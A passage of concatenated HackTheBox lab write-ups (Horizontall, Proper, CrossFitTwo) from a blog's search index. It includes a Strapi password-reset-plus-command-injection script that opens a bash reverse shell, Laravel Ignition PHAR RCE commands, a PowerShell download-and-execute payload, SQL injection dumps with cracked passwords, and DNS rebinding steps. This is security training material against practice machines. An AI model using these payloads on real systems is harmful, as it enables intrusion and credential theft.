4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)80/tcp open http nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: Did not follow redirect to http://horizontall.htbService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel http Server redirect to horizontall.htbfound another subdomain from burp site-mapMaking request to /reviews api is running on Strapi CMSFound some endpoints from fuzzing❯ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://api-prod.horizontall.htb/FUZZ -X POST# ... [snip] ...email [Status: 403, Size: 60, Words: 1, Lines: 1]users [Status: 403, Size: 60, Words: 1, Lines: 1]upload [Status: 403, Size: 60, Words: 1, Lines: 1]❯ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://api-prod.horizontall.htb/FUZZ# ... [snip] ...users [Status: 403, Size: 60, Words: 1, Lines: 1]admin [Status: 200, Size: 854, Words: 98, Lines: 17]/admin give 200 response/admin made 2 requests from /users-permissions/init and /admin/init endpoints in background. This is a development. strapiVersion: 3.0.0-beta.17.4Found some vulnerabilities online. From GitHub Advisory Database Privilege Escalation in strapi: Versions of strapi prior to 3.0.0-beta.17.5 are vulnerable to Privilege Escalation. The password reset routes allows an unauthenticated attacker to reset an admin’s password without providing a valid password reset token. From snyk database Arbitrary Code Injection: Affected versions of this package are vulnerable to Arbitrary Code Injection. The package fails to sanitize plugin names in the /admin/plugins/install/ route. This may allow an authenticated attacker with admin privileges to run arbitrary commands in the server. Exploit PoC Blog: https://bittherapy.net/post/strapi-framework-remote-code-execution/ FootholdImproper Access ControlAffected versions of this package are vulnerable to Improper Access Control. It mishandles password resets within packages/strapi-admin/controllers/Auth.js and packages/strapi-plugin-users-permissions/controllers/Auth.js.From fixed commit we can see that The issue was a lack of validation of the code parameter sent by the user: https://github.com/strapi/strapi/pull/4443/commits/e0424d4b880831dd643afff9c6ba475acdbae0beFound reset password request parameter from packages/strapi-admin/controllers/Auth.jsSending crafted data in the POST request to /admin/auth/reset-passwordAnd get admin user auth token.Now we can login as admin with new reset passwordCommand InjectionStrapi CMS versions &amp;lt;3.0.0-beta.17.8 Affected to Arbitrary Code Injection. The package fails to sanitize plugin names in the /admin/plugins/install/ route. This may allow an authenticated attacker with admin privileges to run arbitrary commands in the server.Based on https://bittherapy.net/post/strapi-framework-remote-code-execution/ blog PoC inject payload in /admin/plugins/install POST request with data {&quot;plugin&quot;:&quot;documentation &amp;amp;&amp;amp; $(&amp;lt;payload&amp;gt;)&quot;, &quot;port&quot;:&quot;80&quot;} executes as Arbitrary Code.RCE python scriptimport requests as rimport jsons = r.Session()# Enable burp proxy# s.proxies = {&#39;http&#39;: &#39;localhost:8080&#39;}url = &#39;http://api-prod.horizontall.htb&#39;# Send Reset password request to retrieve admin jwt tokenreset_data = {&quot;code&quot;: {}, &quot;password&quot;: &quot;p00rduck&quot;, &quot;passwordConfirmation&quot;: &quot;p00rduck&quot;}rspn = s.post(f&quot;{url}/admin/auth/reset-password&quot;, json=reset_data)json_pars = json.loads(rspn.content.decode())print(&quot;[+] Reset Response: \\n&quot; + rspn.content.decode())# Send reverse shell in plugins install requests.headers = {&#39;Authorization&#39;: f&#39;Bearer {json_pars[&quot;jwt&quot;]}&#39;}payload = {&quot;plugin&quot;: &quot;documentation &amp;amp;&amp;amp; $(/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.15.71/4141 0&amp;gt;&amp;amp;1&#39;)&quot;, &quot;port&quot;: &quot;80&quot;}try: rspn = s.post(f&quot;{url}/admin/plugins/install&quot;, json=payload, timeout=10) print(rspn.text)except r.exceptions.Timeout: print(&#39;[!] Exception: timeout&#39;) s.close()PrivescFound database creds from linpeas outputThere are some services running on local ports(remote) strapi@horizontall:/tmp$ ss -lntp | grep 127LISTEN 4 128 127.0.0.1:1337 0.0.0.0:* users:((&quot;node&quot;,pid=1805,fd=31))LISTEN 0 128 127.0.0.1:8000 0.0.0.0:*LISTEN 0 80 127.0.0.1:3306 0.0.0.0:* Port 8000 is running Laravel v8 (PHP v7.4.18) found with curl. Forward port 8000 with socat ./socat tcp-l:8001,fork,reuseaddr tcp:127.0.0.1:8000 &amp;amp;.Now we can access to local port 8000 from remote port 8001. nuclei found laravel debug mode is enabled. Also found CVE-2021-3129 in laravel. Laravel &amp;lt;8.4.2 debug mode with Ignition &amp;lt;2.5.2 RCEIgnition before 2.5.2, as used in Laravel and other products, allows unauthenticated remote attackers to execute arbitrary code because of insecure usage of file_get_contents() and file_put_contents(). This is exploitable on sites using debug mode with Laravel before 8.4.2. PoC Detailed blog: https://www.ambionics.io/blog/laravel-debug-rce Exploit script: https://github.com/ambionics/laravel-exploitsHow this happened is, viewFile parameter from /_ignition/execute-solution request is vulnerable for PHAR deserialization vulnerability.Generate PHAR payload using PHPGGCphp -d&#39;phar.readonly=0&#39; ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system idExecute Script./laravel-ignition-rce.py http://10.10.11.105:8001/ /tmp/exploit.pharGet reverse shell withphp -d&#39;phar.readonly=0&#39; ./phpggc --phar phar -o /tmp/exploit.phar --fast-destruct monolog/rce1 system &#39;/bin/bash -c &quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.15.71/4141 0&amp;gt;&amp;amp;1&quot;&#39;" }, { "title": "Hackthebox - Proper", "url": "/posts/proper/", "categories": "hackthebox, windows", "tags": "sqli, smb rfi, race condition, inotify, eop, golang binary reversing", "date": "2021-08-21 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.231 proper.htbnmap scan:PORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.0| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: OS Tidy Inc.Service Info: OS: Windows; CPE: cpe:/o:microsoft:windowsinteresting javascript code snippet in /index.htmlfrom that javascript code products-ajax.php load product listin this url /products-ajax.php?order=id+desc&amp;amp;h=a1b30d31d344a5a4e41e8496ccbdd26b looks like order parameter contains sql keyword desc in sql that means descending order and if try to change it to ascending aes, server return security error.❯ curl -i -s &#39;http://10.10.10.231/products-ajax.php?order=id+aes&amp;amp;h=a1b30d31d344a5a4e41e8496ccbdd26b&#39;HTTP/1.1 403 ForbiddenContent-Type: text/html; charset=UTF-8Server: Microsoft-IIS/10.0X-Powered-By: PHP/7.4.1Date: Sat, 21 Aug 2021 08:20:17 GMTContent-Length: 39Forbidden - Tampering attempt detected.If remove all parameter and only request /products-ajax.php, return snippet of source code in error```bash❯ curl -s ‘http://10.10.10.231/products-ajax.php’Parameter missing or malformed.**Gobuster** running in background found a directory```bash/licenses (Status: 301) [Size: 152] [--&amp;gt; http://10.10.10.231/licenses/]Contains a login pageAfter combine url parameters and source code snippets from response error./products-ajax.php?order=id+desc&amp;amp;h=a1b30d31d344a5a4e41e8496ccbdd26border parameter contains a value that used by server backend and h contains md5 hash, Generated from order parameter value and salt hie0shah6ooNoim.And indeed it is same.❯ python -c &quot;from hashlib import md5;print(md5((&#39;hie0shah6ooNoim&#39;+&#39;id desc&#39;).encode(&#39;utf-8&#39;)).hexdigest())&quot;a1b30d31d344a5a4e41e8496ccbdd26bsql injectionTesting sql injection with sqlmap and Found boolean-based blind sql injection.sqlmap --eval=&quot;import hashlib;h=hashlib.md5((&#39;hie0shah6ooNoim&#39;+order).encode(&#39;utf-8&#39;)).hexdigest()&quot; --batch --dbms=mysql --threads=10 -u &quot;http://10.10.10.231/products-ajax.php?order=id+desc&amp;amp;h=a1b30d31d344a5a4e41e8496ccbdd26b&quot;#... [snip] ...---Parameter: order (GET) Type: boolean-based blind Title: Boolean-based blind - Parameter replace (original value) Payload: order=(SELECT (CASE WHEN (7143=7143) THEN &#39;id desc&#39; ELSE (SELECT 8447 UNION SELECT 3809) END))&amp;amp;h=a1b30d31d344a5a4e41e8496ccbdd26b---#... [snip] ...After enumerating dbms, Dumping user credentialssqlmap --eval=&quot;import hashlib;h=hashlib.md5((&#39;hie0shah6ooNoim&#39;+order).encode(&#39;utf-8&#39;)).hexdigest()&quot; --batch --dbms=mysql --threads=10 -u &quot;http://10.10.10.231/products-ajax.php?order=id+desc&amp;amp;h=a1b30d31d344a5a4e41e8496ccbdd26b&quot; -D cleaner -T customers --dump#... [snip] ...Database: cleaner Table: customers[29 entries]+----+------------------------------+----------------------------------------------+----------------------+| id | login | password | customer_name |+----+------------------------------+----------------------------------------------+----------------------+| 1 | vikki.solomon@throwaway.mail | 7c6a180b36896a0a8c02787eeafb0e4c (password1) | Vikki Solomon || 2 | nstone@trashbin.mail | 6cb75f652a9b52798eb6cf2201057c73 (password2) | Neave Stone || 3 | bmceachern7@discovery.moc | e10adc3949ba59abbe56e057f20f883e (123456) | Bertie McEachern || 4 | jkleiser8@google.com.xy | 827ccb0eea8a706c4c34a16891f84e7b (12345) | Jordana Kleiser || 5 | mchasemore9@sitemeter.moc | 25f9e794323b453885f5181f1b624d0b (123456789) | Mariellen Chasemore || 6 | gdornina@marriott.moc | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Gwyneth Dornin || 7 | itootellb@forbes.moc | f25a2fc72690b780b2a14e140ef6a9e0 (iloveyou) | Israel Tootell || 8 | kmanghamc@state.tx.su | 8afa847f50a716e64932d995c8e7435a (princess) | Karon Mangham || 9 | jblinded@bing.moc | fcea920f7412b5da7be0cf42b8c93759 (1234567) | Janifer Blinde || 10 | llenchenkoe@macromedia.moc | f806fc5a2a0d5ba2471600758452799c (rockyou) | Laurens Lenchenko || 11 | aaustinf@booking.moc | 25d55ad283aa400af464c76d713c07ad (12345678) | Andreana Austin || 12 | afeldmesserg@ameblo.pj | e99a18c428cb38d5f260853678922e03 (abc123) | Arnold Feldmesser || 13 | ahuntarh@seattletimes.moc | fc63f87c08d505264caba37514cd0cfd (nicole) | Adella Huntar || 14 | talelsandrovichi@tamu.ude | aa47f8215c6f30a0dcdb2a36a9f4168e (daniel) | Trudi Alelsandrovich || 15 | ishayj@dmoz.gro | 67881381dbc68d4761230131ae0008f7 (babygirl) | Ivy Shay || 16 | acallabyk@un.gro | d0763edaa9d9bd2a9516280e9044d885 (monkey) | Alys Callaby || 17 | daeryl@about.you | 061fba5bdfc076bb7362616668de87c8 (lovely) | Dorena Aery || 18 | aalekseicikm@skyrock.moc | aae039d6aa239cfc121357a825210fa3 (jessica) | Amble Alekseicik || 19 | lginmann@lycos.moc | c33367701511b4f6020ec61ded352059 (654321) | Lin Ginman || 20 | lgiorioo@ow.lic | 0acf4539a14b3aa27deeb4cbdf6e989f (michael) | Letty Giorio || 21 | lbyshp@wired.moc | adff44c5102fca279fce7559abf66fee (ashley) | Lazarus Bysh || 22 | bklewerq@yelp.moc | d8578edf8458ce06fbc5bb76a58c5ca4 (qwerty) | Bud Klewer || 23 | wstrettellr@senate.gov | 96e79218965eb72c92a549dd5a330112 (111111) | Woodrow Strettell || 24 | lodorans@kickstarter.moc | edbd0effac3fcc98e725920a512881e0 (iloveu) | Lila O Doran || 25 | bpfeffelt@artisteer.moc | 670b14728ad9902aecba32e22fa4f6bd (000000) | Bibbie Pfeffel || 26 | lgrimsdellu@abc.net.uvw | 2345f10bb948c5665ef91f6773b3e455 (michelle) | Luce Grimsdell || 27 | lpealingv@goo.goo | f78f2477e949bee2d12a2c540fb6084f (tigger) | Lyle Pealing || 28 | krussenw@mit.ude | 0571749e2ac330a7455809c6b0e7af90 (sunshine) | Kimmy Russen || 29 | meastmondx@businessweek.moc | c378985d629e99a4e86213db0cd5e70d (chocolate) | Meg Eastmond |+----+------------------------------+----------------------------------------------+----------------------+sqlmap do the job and bruteforce all password hashes.Login with customer creds, Found Same url formate inside /licenses dashboardDoing same hashing technique this tile return php traceback error.❯ python -c &quot;from hashlib import md5;print(md5((&#39;hie0shah6ooNoim&#39;+&#39;test&#39;).encode(&#39;utf-8&#39;)).hexdigest())&quot;d9f7afc366cf839391aac8d0d333c7c5this time server is doing file_get_contents on theme parameter.SMB connect via remote file inclusionCreate a python script to make life easyfrom hashlib import md5from sys import argvfrom urllib.parse import quote_plusimport requests as rs = r.session()url = &#39;http://10.10.10.231/licenses/&#39;data = {&quot;username&quot;: &quot;vikki.solomon@throwaway.mail&quot;, &quot;password&quot;: &quot;password1&quot;}s.post(url, data=data) # logintheme_param = argv[1]hash = md5(b&quot;hie0shah6ooNoim&quot; + theme_param.encode(&#39;utf-8&#39;)).hexdigest()rspn = s.get(f&#39;{url}licenses.php?theme={quote_plus(theme_param)}&amp;amp;h={hash}&#39;)head, sep, tail = rspn.text.partition(&#39;&amp;lt;body&amp;gt;&#39;)print(head)s.close()Testing theme parameterLFI not possible because server script appending /header.inc in the end of the path.❯ python rfi.py &#39;/etc/passwd&#39;&amp;lt;!-- [2] file_get_contents(/etc/passwd/header.inc): failed to open stream: No such file or directoryRFI over http:// wrapper is disabled.❯ python rfi.py &#39;http://10.10.15.71&#39;&amp;lt;!-- [2] include(): http:// wrapper is disabled in the server configuration by allow_url_include=0When try to connect to smb server,❯ impacket-smbserver -smb2support smb .it return “failed to open stream” but smb server get authentication request.That means server is trying to connect to the smb server with credentials.this is a Net-NTLMv2 hash and cracked with rockyou.txtSetup sbm server with creds and successfully included /header.inc from from smb server❯ impacket-smbserver -smb2support smb . -username web -password &#39;charlotte123!&#39;If we go back to initial error, we can see that there is a another security check 33 | function secure_include($file) { 34 | if (strpos(file_get_contents($file),&#39;&amp;lt;?&#39;) === false) { 35 | include($file);This means, If included file contains &amp;lt;? anywhere in the file, it exit out and if not than again doing a another include on that file with include() function. include() function is used to put data of one PHP file into another PHP file.And if we calculate time, it definitely takes few seconds to execute both includes if all conditions are true.Race condition with inotifyThe inotify API provides a mechanism for monitoring filesystem events. Inotify can be used to monitor individual files, or to monitor directories. When a directory is monitored, inotify will return events for the directory itself, and for files inside the directory.Get inotify-tools from sudo apt install inotify-toolsWe can monitor all events on specific file and do something on every event.Using inotifywait utility from inotify-tools with -e flag to monitor specific event.-e|--event &amp;lt;event1&amp;gt; [ -e|--event &amp;lt;event2&amp;gt; ... ] Listen for specific event(s). If omitted, all events are listened for.Events: close file or directory closed, regardless of read/write modeWith that tool finally get php code executed on the server, only issue occurred is that there is some delay between 2 includes, after first closing and second opening of the file. For that i setup 2 event listener, first for closing and second for opening.echo poorduck &amp;gt; header.inc; inotifywait -e close header.inc;inotifywait -e open header.inc; echo &#39;&amp;lt;?php echo &quot;poorduck from php!&quot;;?&amp;gt;&#39; &amp;gt; header.incGetting reverse shell with PayloadsAllTheThings powershell payload and nishang revshell ps1echo poorduck &amp;gt; header.inc; inotifywait -e close header.inc; inotifywait -e open header.inc; echo &quot;&amp;lt;?php system(\\&quot;powershell IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.15.71/powerShellTcp.ps1&#39;)\\&quot;);?&amp;gt;&quot; &amp;gt; header.incPrivesc Golang binary reversing. EoP - Privileged File Write 0xdf writeup ippsec video" }, { "title": "Hackthebox - CrossFitTwo", "url": "/posts/crossFitTwo/", "categories": "hackthebox, linux", "tags": "websocket client, sqli, dns, fake dns, dns hijacking, relayd, dns rebinding, unbound, cssrf, cors, Socket-io hooking, node module hijack, yubikey", "date": "2021-08-20 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.232 crossfit.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4 (protocol 2.0)| ssh-hostkey: | 3072 35:0a:81:06:de:be:8c:d8:d7:27:66:db:96:94:fd:52 (RSA)| 256 94:60:55:35:9a:1a:a8:45:a1:ae:19:cd:61:05:ec:3f (ECDSA)|_ 256 a2:c8:6b:6e:11:b6:70:69:db:d2:60:2e:2f:d1:2f:ab (ED25519)80/tcp open http (PHP 7.4.12)|_http-server-header: OpenBSD httpd|_http-title: CrossFit8953/tcp open ssl/ub-dns-control?| ssl-cert: Subject: commonName=unbound| Not valid before: 2021-01-11T07:01:10|_Not valid after: 2040-09-28T07:01:10 OS: OpenBSD Port 8953 is running Unbound dns server. Unbound is a validating, recursive, caching DNS resolver. Found 2 subdomains from burpsuite spidergym.crossfit.htbemployees.crossfit.htbemployees.crossfit.htb contains a login page.gym.crossfit.htb have WebSocket API used for chat feature.FootholdWebsocket WebSocket API is an advanced technology that makes it possible to open a two-way interactive communication session between the user’s browser and a server.There are three commands. When we use third command memberships to check memberships and click on any membershipit send a request with a extra parameter: &quot;params&quot;:&quot;1&quot;And another thing is that every request uses a unique token, when client first time connect to the server, server send a token that uses in the client’s next request and this token changes every time when server response to a client.Websocket client python scriptimport argparseimport sysimport websocketsimport asyncioimport jsonurl = &quot;ws://gym.crossfit.htb/ws/&quot;parser = argparse.ArgumentParser()parser.add_argument(&#39;-m&#39;, &#39;--message&#39;, help=&#39;Send command&#39;)parser.add_argument(&#39;-p&#39;, &#39;--params&#39;, help=&#39;Test &quot;params&quot; parameter&#39;)args = parser.parse_args()async def lets_talk(): async with websockets.connect(url) as ws: msg = await ws.recv() json_data = json.loads(msg) payload = json.dumps({&quot;message&quot;: &quot;help&quot;, &quot;token&quot;: json_data[&quot;token&quot;]}) if args.message: payload = json.dumps({&quot;message&quot;: args.message, &quot;token&quot;: json_data[&quot;token&quot;]}) elif args.params: payload = json.dumps({&quot;message&quot;: &quot;available&quot;, &quot;params&quot;: args.params, &quot;token&quot;: json_data[&quot;token&quot;]}) print(f&quot;&amp;lt; {payload}&quot;) await ws.send(payload) msg = await ws.recv() print(f&quot;&amp;gt; {msg}&quot;)if __name__ == &quot;__main__&quot;: try: if len(sys.argv) == 1: parser.print_help() else: asyncio.get_event_loop().run_until_complete(lets_talk()) except KeyboardInterrupt: print(&#39; KeyboardInterrupt&#39;)While testing params parameter found sql injections.Boolean based Blind SQL InjectionSQL UNION injectionSQL injectionwebsocket client mitm serverCreating a php server based websocket client so we can automate sql injection with sqlmap. There is a library textalk/websocket, We can use for websocket in php.Install it in project foldercomposer require textalk/websocketCreate php script&amp;lt;?phprequire &#39;vendor/autoload.php&#39;;use WebSocket\\Client;$client = new WebSocket\\Client(&quot;ws://gym.crossfit.htb/ws/&quot;);$recv_token = $client-&amp;gt;receive();$token = json_decode($recv_token, true)[&quot;token&quot;];$payload = json_encode(array(&#39;message&#39; =&amp;gt; &#39;available&#39;, &#39;params&#39; =&amp;gt; $_GET[&#39;id&#39;], &#39;token&#39; =&amp;gt; $token));$client-&amp;gt;send($payload);echo $client-&amp;gt;receive();$client-&amp;gt;close();?&amp;gt;Boolean based Blind SQL Injection Found injection with payload: 1 AND 1=1And now we can use sqlmap to automate sql injection.Some sqlmap flags to make scan more accurate based on known information.--technique=TECH.. SQL injection techniques to use (default &quot;BEUSTQ&quot;)--string=STRING String to match when query is evaluated to True#retrieving database namessqlmap -u &#39;http://10.10.15.71:8000/websocket-client.php?id=1&#39; --batch --string=&#39;Good news!&#39; --technique=B --threads=10 --dbms=mysql --dbsavailable databases [3]:[*] crossfit[*] employees[*] information_schema#retrieving tablessqlmap -u &#39;http://10.10.15.71:8000/websocket-client.php?id=1&#39; --batch --string=&#39;Good news!&#39; --technique=B --threads=10 --dbms=mysql -D employees --tablesDatabase: employees[2 tables]+----------------+| employees || password_reset |+----------------+#dump datasqlmap -u &#39;http://10.10.15.71:8000/websocket-client.php?id=1&#39; --batch --string=&#39;Good news!&#39; --technique=B --threads=10 --dbms=mysql -D employees -T employees --dumpThese password hashes are not crackableCheck if database user have any privilegesdatabase management system users privileges:[*] %crossfit_user% [1]: privilege: FILE From mysql docs “A user who has the FILE privilege can read any file on the server host that is either world-readable or readable by the MySQL server.” sql payload for boolean based blind injection for checking if file exist: 1 AND !isnull(load_file(0x&amp;lt;filepath_in_hexadecimal&amp;gt;)) Check /etc/passwd file❯ python websocket.py -p &#39;1 AND 1 AND !isnull(load_file(0x2f6574632f706173737764))&#39;&amp;lt; {&quot;message&quot;: &quot;available&quot;, &quot;params&quot;: &quot;1 AND 1 AND !isnull(load_file(0x2f6574632f706173737764))&quot;, &quot;token&quot;: &quot;97c47b19d8c2fc7f2ea9cfe79078fb2279478e15c4fb2ede301b8ad4c3d08e46&quot;}&amp;gt; {&quot;status&quot;:&quot;200&quot;,&quot;message&quot;:&quot;Good news! This membership plan is available.&quot;,&quot;token&quot;:&quot;645e596d99d2d03b82588868b437831c89f13bda4c168b318ed59b6d5f00a7b6&quot;,&quot;debug&quot;:&quot;[id: 1, name: 1-month]&quot;}Read file with sqlmapsqlmap -u &#39;http://10.10.15.71:8000/websocket-client.php?id=1&#39; --batch --string=&#39;Good news!&#39; --technique=B --threads=10 --file-read=&quot;/etc/passwd&quot;UNION sql injection to Read file Found injection with payload: 3 UNION SELECT 1,2This is more faster than blind injection because values are reflated in the response.Updated Websocket client python scriptimport argparseimport sysimport websocketsimport asyncioimport jsonurl = &quot;ws://gym.crossfit.htb/ws/&quot;parser = argparse.ArgumentParser()parser.add_argument(&#39;-m&#39;, &#39;--message&#39;, help=&#39;Send command&#39;)parser.add_argument(&#39;-p&#39;, &#39;--params&#39;, help=&#39;&quot;params&quot; parameter value&#39;)parser.add_argument(&#39;-u&#39;, &#39;--union&#39;, action=&#39;store_true&#39;, help=&#39;Enable UNION injection&#39;)parser.add_argument(&#39;-f&#39;, &#39;--file&#39;, action=&#39;store_true&#39;, help=&#39;Enable file reading&#39;)args = parser.parse_args()async def lets_talk(): async with websockets.connect(url) as ws: msg = await ws.recv() json_data = json.loads(msg) payload = json.dumps({&quot;message&quot;: &quot;help&quot;, &quot;token&quot;: json_data[&quot;token&quot;]}) if args.message: payload = json.dumps({&quot;message&quot;: args.message, &quot;token&quot;: json_data[&quot;token&quot;]}) elif args.params: if args.union: payload = json.dumps({&quot;message&quot;: &quot;available&quot;, &quot;params&quot;: f&quot;3 UNION SELECT ({args.params}),2&quot;, &quot;token&quot;: json_data[&quot;token&quot;]}) # print(f&quot;&amp;lt; {payload}&quot;) await ws.send(payload) msg = await ws.recv() json_data = json.loads(msg) rspn = json_data[&quot;debug&quot;][5:-9].replace(&#39;,&#39;, &#39;\\n&#39;) print(rspn) exit(0) elif args.file: payload = json.dumps({&quot;message&quot;: &quot;available&quot;, &quot;params&quot;: f&quot;3 UNION SELECT (select load_file(&#39;{args.params}&#39;)),2&quot;, &quot;token&quot;: json_data[&quot;token&quot;]}) # print(f&quot;&amp;lt; {payload}&quot;) await ws.send(payload) msg = await ws.recv() json_data = json.loads(msg) rspn = json_data[&quot;debug&quot;][5:-9] print(rspn) exit(0) else: payload = json.dumps({&quot;message&quot;: &quot;available&quot;, &quot;params&quot;: args.params, &quot;token&quot;: json_data[&quot;token&quot;]}) print(f&quot;&amp;lt; {payload}&quot;) await ws.send(payload) msg = await ws.recv() print(f&quot;&amp;gt; {msg}&quot;)if __name__ == &quot;__main__&quot;: try: if len(sys.argv) == 1: parser.print_help() else: asyncio.get_event_loop().run_until_complete(lets_talk()) except KeyboardInterrupt: print(&#39; KeyboardInterrupt&#39;) Retrieve all Databases names: SELECT group_concat(schema_name) FROM information_schema.schemata Retrieve all tables of specific database: Select group_concat(table_name) from information_schema.tables where table_schema=&#39;&amp;lt;database_name&amp;gt;&#39; Retrieve all columns of specific table: SELECT group_concat(column_name) from information_schema.columns where table_name =&#39;tablename&#39; Retrieve columns: SELECT group_concat(column1,&quot;:&quot;,column2) from &amp;lt;database_Name&amp;gt;.&amp;lt;table_Name&amp;gt; Check dbms users privileges: SELECT group_concat(grantee,&#39;:&#39;,privilege_type) FROM information_schema.user_privileges Read file: SELECT load_file(&#39;&amp;lt;file_name&amp;gt;&#39;)**DNS HijackingrelaydWhile checking conf files, one interesting file found is httpd server. OpenBSD httpd server config file default path is /etc/httpd.confhost/subdomains listening on different local port but we can access them from remote port 80.❯ python websocket.py -f -p &quot;/etc/httpd.conf&quot;server &quot;0.0.0.0&quot; { no log listen on lo0 port 8000... [snip] ...server &quot;employees&quot; { no log listen on lo0 port 8001... [snip] ...server &quot;chat&quot; { no log listen on lo0 port 8002... [snip] ...OpenBSD uses relayd for doing this. relayd is a daemon to relay and dynamically redirect incoming connections to a target host. OpenBSD relayd config file path is &quot;/etc/relayd.conf&quot;❯ python websocket.py -f -p &#39;/etc/relayd.conf&#39;table&amp;lt;1&amp;gt;{127.0.0.1}table&amp;lt;2&amp;gt;{127.0.0.1}table&amp;lt;3&amp;gt;{127.0.0.1}table&amp;lt;4&amp;gt;{127.0.0.1}http protocol web{ pass request quick header &quot;Host&quot; value &quot;*crossfit-club.htb&quot; forward to &amp;lt;3&amp;gt; pass request quick header &quot;Host&quot; value &quot;*employees.crossfit.htb&quot; forward to &amp;lt;2&amp;gt; match request path &quot;/*&quot; forward to &amp;lt;1&amp;gt; match request path &quot;/ws*&quot; forward to &amp;lt;4&amp;gt; http websockets}table&amp;lt;5&amp;gt;{127.0.0.1}table&amp;lt;6&amp;gt;{127.0.0.1 127.0.0.2 127.0.0.3 127.0.0.4}http protocol portal{ pass request quick path &quot;/&quot; forward to &amp;lt;5&amp;gt; pass request quick path &quot;/index.html&quot; forward to &amp;lt;5&amp;gt; pass request quick path &quot;/home&quot; forward to &amp;lt;5&amp;gt; pass request quick path &quot;/login&quot; forward to &amp;lt;5&amp;gt; pass request quick path &quot;/chat&quot; forward to &amp;lt;5&amp;gt; pass request quick path &quot;/js/*&quot; forward to &amp;lt;5&amp;gt; pass request quick path &quot;/css/*&quot; forward to &amp;lt;5&amp;gt; pass request quick path &quot;/fonts/*&quot; forward to &amp;lt;5&amp;gt; pass request quick path &quot;/images/*&quot; forward to &amp;lt;5&amp;gt; pass request quick path &quot;/favicon.ico&quot; forward to &amp;lt;5&amp;gt; pass forward to &amp;lt;6&amp;gt; http websockets}relay web{ listen on &quot;0.0.0.0&quot; port 80 protocol web forward to &amp;lt;1&amp;gt; port 8000 forward to &amp;lt;2&amp;gt; port 8001 forward to &amp;lt;3&amp;gt; port 9999 forward to &amp;lt;4&amp;gt; port 4419}relay portal{ listen on 127.0.0.1 port 9999 protocol portal forward to &amp;lt;5&amp;gt; port 8002 forward to &amp;lt;6&amp;gt; port 5000 mode source-hash} Found another host crossfit-club.htb &quot;*crossfit-club.htb&quot; And &quot;*employees.crossfit.htb&quot; contains a wildcard.Unboundwith file read we can also read unbound config file and retrieve its server and control key. With these files we can edit server dns entries. OpenBSD install unbound config file in /var/unbound/etc/unbound.confGet cerf file locations from config fileserver-key-file: &quot;/var/unbound/etc/tls/unbound_server.key&quot;server-cert-file: &quot;/var/unbound/etc/tls/unbound_server.pem&quot;control-key-file: &quot;/var/unbound/etc/tls/unbound_control.key&quot;control-cert-file: &quot;/var/unbound/etc/tls/unbound_control.pem&quot;Download all file and add there path in a local unbound config file to connect to remote unbound server.remote-control: server-cert-file: &quot;/crossFitTwo/dump/unbound_server.pem&quot; control-key-file: &quot;/crossFitTwo/dump/unbound_control.key&quot; control-cert-file: &quot;/crossFitTwo/dump/unbound_control.pem&quot;DNS Hijacking There is a “forgot password” option in employees.crossfit.htb login page. Found Email address from sql injection ❯ python websocket.py -u -p &quot;SELECT group_concat(email) from employees.employees&quot;david.palmer@crossfit.htbjack.parker@crossfit.htbmaria.williams@crossfit.htbwill.smith@crossfit.htb and david.palmer@crossfit.htb is admin. When we send password reset request, server send a email to that user with reset link. From relayd config file we found that server resolve *employees.crossfit.htb where wildcard can be anything it still resolve employees.crossfit.htb. And we can write any rule in unbound-control. unbound flag forward_add [+i] allow to add forward zone. If we add a new host “anything-employees.crossfit.htb” in unbound-control that resolve from attacker dns server and than request password reset from that domain. It will go through relayd proxy and resolve this domain as “*employees.crossfit.htb” and send email from “anything-employees.crossfit.htb” domain. When Victim click on reset link, crossfit’s unbound-control forward this domain’s dns query to attacker’s dns server and attacker dns server will return attacker’s http server’s ip address for that domain.this is a messed up situation, that why i create a mind map to understand this situation clearly.Add forward zone rule in unbound-control from unbound-control man page, There is a flag forward_add [+i] that “Add a new forward zone to running unbound.”unbound-control -c unbound.conf -s 10.10.10.232 forward_add +i &amp;lt;Domain_name&amp;gt; &amp;lt;DNS_server_IP&amp;gt;Setup fake dns and http serverdnschef -i &amp;lt;VPN_IP&amp;gt; --fakedomains &amp;lt;Domain_name&amp;gt; --fakeip &amp;lt;VPN_IP&amp;gt;Get DNS quarry but don’t get any http request. Server response with “Only local hosts are allowed”. That means there are some security measures in the server that checks if dns resolves localhost or not.Replacing domain ip to localhost 127.0.0.1This time get more dns queries, But still don’t get any http request from victim. That’s because victim can not reach to attacker’s localhost.DNS RebindingHere DNS Rebinding comes into play.Basic motive of dns rebinding is that the server accepts a certain number of requests from a client for a domain and then it changes the IP address to a different one.dnschef don’t have dns rebinding feature but there is a python script on github FakeDns that can help in this situation.Create config file for FakeDns with a dns rebind rule.A ex-employees.crossfit.htb 127.0.0.1 2%10.10.15.71We add 2 before % that means that server takes 2 request on IP 127.0.0.1 and then change IP to 10.10.15.71.And this time get request on http server and get reset link.But link is not working.But reset request we got on our server contains Referer header value http://crossfit-club.htb/.This means that user click on link from crossfit-club.htb vHost.vHostcrossfit-club.htb have a login page that send login request to a api endpoint.And there is a signup option, That is disabled.Found 2 endpoints from api fuzzing with GET method and 2 from POST method.ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://crossfit-club.htb/api/FUZZauth [Status: 200, Size: 66, Words: 1, Lines: 1]ping [Status: 200, Size: 71, Words: 3, Lines: 1]ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://crossfit-club.htb/api/FUZZ -X POSTlogin [Status: 200, Size: 50, Words: 3, Lines: 1]signup [Status: 200, Size: 50, Words: 3, Lines: 1]auth response with a tokedTry to get signup, return csrf token errorWhen try to login, get the csrf token 